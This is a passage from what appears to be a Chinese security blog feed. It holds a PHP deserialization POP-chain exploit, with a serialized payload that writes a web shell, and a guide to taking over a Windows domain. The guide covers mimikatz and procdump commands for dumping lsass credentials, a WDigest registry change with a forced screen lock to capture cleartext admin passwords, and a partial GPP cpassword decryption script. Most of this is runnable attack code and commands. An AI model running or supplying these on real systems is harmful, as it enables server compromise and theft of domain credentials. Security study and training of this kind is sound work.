punctuation">.</span> <span class="token string">"'>&lt;i>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/i>&lt;/a> by "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logger</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Song "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">" by [i]"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span> <span class="token punctuation">.</span> <span class="token string">"[/i] viewed.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Lyrics</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$song</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$lyrics</span><span class="token punctuation">,</span> <span class="token variable">$song</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span> <span class="token operator">=</span> <span class="token variable">$song</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span> <span class="token operator">=</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>&lt;p>"</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">shortForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>&lt;a href='song.php?name="</span> <span class="token punctuation">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>song<span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/a>&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">name_is</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">addLyrics</span><span class="token punctuation">(</span><span class="token variable">$lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$oldlyrics</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$oldlyrics</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$lyrics</span> <span class="token keyword">as</span> <span class="token variable">$lyric</span><span class="token punctuation">)</span> <span class="token variable">$oldlyrics</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token variable">$lyric</span><span class="token punctuation">;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'lyrics'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$oldlyrics</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">getLyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'lyrics'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>User<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getLyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在进行反序列化漏洞的时候，我们需要找到可控的unserialize，这里发现$_COOKIE[‘lyrics’]参数可控，有了可控的参数，就需要找到魔术方法来自动调用，这里危险函数在LogWriter_File这个类，这时就需要构造POP链了。</p><p>首先来看魔术方法，在Lyrics类中存在两个魔术方法，发现对象在销毁的时候调用了$this-&gt;song-&gt;log()，而log方法又在Logger这个类中存在，所以属性$this-&gt;song应该为new Logger()。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Lyrics</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$song</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>&lt;p>"</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">shortForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>&lt;a href='song.php?name="</span> <span class="token punctuation">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>song<span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/a>&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">name_is</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>继续找，当实例化对象Lyricsde时，log方法存在$this-&gt;logwriter-&gt;writeLog，而writeLog又存在于LogWriter_File类中，这好这个类是我们的漏洞触发点，所以$this-&gt;logwriter应该为new LogWriter_Fil()，构造下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Logger</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logwriter</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LogWriter_File</span><span class="token punctuation">(</span><span class="token string">'123.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>实例化对象Logger之后，调用了LogWriter_File的writeLog方法，而写入文件的txt是通过$this-&gt;format-&gt;format获得，而format方法存在类LogFileFormat中，所以，构造如下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">LogWriter_File</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LogFileFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 111</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//TODO: Modify the address here, and delete this TODO.</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"D:\\phpStudy\\WWW\\ctf"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>在类LogFileFormat中的format方法中利用$filter-&gt;filter来获取的$txt，而$filter是通过foreach获取的，所以$this-&gt;filters为一个数组，最终OutputFilter传入写入文件的内容，就可以构造如下payload：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">OutputFilter</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$matchPattern</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$replacement</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span> <span class="token operator">=</span> '<span class="token comment" spellcheck="true">//';</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span> <span class="token operator">=</span> <span class="token string">'&lt;?= `whoami`?>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogFileFormat</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OutputFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 111</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$filter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>最后，将payload组合起来，利用serialize输出下序列化的结果</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/4.png" alt="4" loading="lazy"></p><pre><code>O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A3%3A%22111%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A7%3A%22123.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A14%3A%22%3C%3F%3D+%60whoami%60%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D</code></pre><p>在base64下通过cookie传入就可以写入ctf123.php了</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/5.png" alt="5" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/</a></p><p>2.<a href="https://xz.aliyun.com/t/3674#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-9</a></p><p>3.<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80" target="_blank" rel="noopener">https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;序列化与反序列化&quot;&gt;&lt;a href=&quot;#序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化&quot;&gt;&lt;/a&gt;&lt;strong&gt;序列化与反序列化&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在php中，使用serialize和unserialize
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>获取域控的方法</title>
    <link href="http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2020/02/26/%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2020-02-26T10:35:58.000Z</published>
    <updated>2020-02-26T10:48:00.083Z</updated>
    
    <content type="html"><![CDATA[<h4 id="高权限读取本地密码"><a href="#高权限读取本地密码" class="headerlink" title="高权限读取本地密码"></a><strong>高权限读取本地密码</strong></h4><p>当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的lsass.exe，可以通过mimikatz来读取到本地的明文密码。</p><pre><code>privilege::debug  # 提权sekurlsa::logonpasswords</code></pre><p>如果主机存在杀软的时候，上传mimikatz很多时候都会被杀掉，可以通过<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">procdump</a>+mimikatz的方式进行绕过。先导出lsass.exe</p><pre><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p>保存到本地，通过mimikatz读lsass.dmp的明文</p><pre><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;  &gt; 1.txt</code></pre><p>如果目标机器是windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录及可以读取明文。</p><p>添加注册表，设置UseLogonCredential设置为1</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p>利用powershell脚本进行锁屏</p><pre><code>Function Lock-WorkStation {$signature = @&quot;[DllImport(&quot;user32.dll&quot;, SetLastError = true)]public static extern bool LockWorkStation();&quot;@$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru$LockWorkStation::LockWorkStation() | Out-Null}Lock-WorkStation</code></pre><p>管理员重新登录后就可以抓取到明文密码了。</p><h4 id="SYSVOL还原组策略"><a href="#SYSVOL还原组策略" class="headerlink" title="SYSVOL还原组策略"></a><strong>SYSVOL还原组策略</strong></h4><p>在域环境中，有个默认的共享路径</p><pre><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></pre><p>SYSVOL是活动目录存储文件服务副本的共享文件夹，里面包含有登录脚本，组策略数据等，域里的所有用户都能访问这个共享文件。在SYSVOL目录下，默认是没有groups.xml文件的，必须创建组策略脚本登录才有这个文件。在groups.xml文件中，密码是通过AES-256加密的，但是微软发布了AES的<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" rel="noopener">私钥</a>。</p><p>可以利用powershell解密密文:</p><pre class=" language-powershell"><code class="language-powershell"><span class="token keyword">function</span> Get<span class="token operator">-</span>DecryptedCpassword <span class="token punctuation">{</span>    <span class="token namespace">[CmdletBinding()]</span>    <span class="token keyword">Param</span> <span class="token punctuation">(</span>        <span class="token namespace">[string]</span> <span class="token variable">$Cpassword</span>    <span class="token punctuation">)</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">#Append appropriate padding based on string length  </span>        <span class="token variable">$Mod</span> = <span class="token punctuation">(</span><span class="token variable">$Cpassword</span><span class="token punctuation">.</span>length <span class="token operator">%</span> 4<span class="token punctuation">)</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$Mod</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token string">'1'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> = <span class="token variable">$Cpassword</span><span class="token punctuation">.</span>Substring<span class="token punctuation">(</span>0<span class="token punctuation">,</span><span class="token variable">$Cpassword</span><span class="token punctuation">.</span>Length <span class="token operator">-</span>1<span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token string">'2'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span>4 <span class="token operator">-</span> <span class="token variable">$Mod</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token string">'3'</span> <span class="token punctuation">{</span><span class="token variable">$Cpassword</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span>4 <span class="token operator">-</span> <span class="token variable">$Mod</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$Base64Decoded</span> = <span class="token namespace">[Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token variable">$Cpassword</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#Create a new AES .NET Crypto Object</span>        <span class="token variable">$AesObject</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Security<span class="token punctuation">.</span>Cryptography<span class="token punctuation">.</span>AesCryptoServiceProvider        <span class="token namespace">[Byte[]</span><span class="token punctuation">]</span> <span class="token variable">$AesKey</span> = @<span class="token punctuation">(</span>0x4e<span class="token punctuation">,</span>0x99<span class="token punctuation">,</span>0x06<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>0xfc<span class="token punctuation">,</span>0xb6<span class="token punctuation">,</span>0x6c<span class="token punctuation">,</span>0xc9<span class="token punctuation">,</span>0xfa<span class="token punctuation">,</span>0xf4<span class="token punctuation">,</span>0x93<span class="token punctuation">,</span>0x10<span class="token punctuation">,</span>0x62<span class="token punctuation">,</span>0x0f<span class="token punctuation">,</span>0xfe<span class="token punctuation">,</span>0xe8<span class="token punctuation">,</span>                             